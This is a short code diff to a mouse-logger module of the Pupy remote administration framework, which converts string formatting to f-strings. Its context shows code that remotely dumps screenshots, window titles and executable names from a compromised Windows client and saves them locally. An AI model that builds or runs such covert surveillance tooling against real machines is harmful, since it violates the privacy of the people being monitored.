@@ -34,7 +34,7 @@ class MouseLoggerModule(PupyModule):
             mouselogger_dump = self.client.remote('pupwinutils.mouselogger', 'mouselogger_dump')
             screenshots_list = mouselogger_dump()
 
-            self.success("%s screenshots taken"%len(screenshots_list))
+            self.success(f"{len(screenshots_list)} screenshots taken")
 
             for d, height, width, exe, win_title, buf in screenshots_list:
                 try:
@@ -45,10 +45,10 @@ class MouseLoggerModule(PupyModule):
 
                     with open(filepath, 'w+') as output:
                         output.write(buf)
-                        self.info("screenshot saved to {}".format(filepath))
+                        self.info(f"screenshot saved to {filepath}")
 
                 except Exception as e:
-                    self.error("Error saving a screenshot: %s"%str(e))
+                    self.error(f"Error saving a screenshot: {str(e)}")
 
         elif args.action == "stop":
             mouselogger_stop = self.client.remote('pupwinutils.mouselogger', 'mouselogger_stop', False)
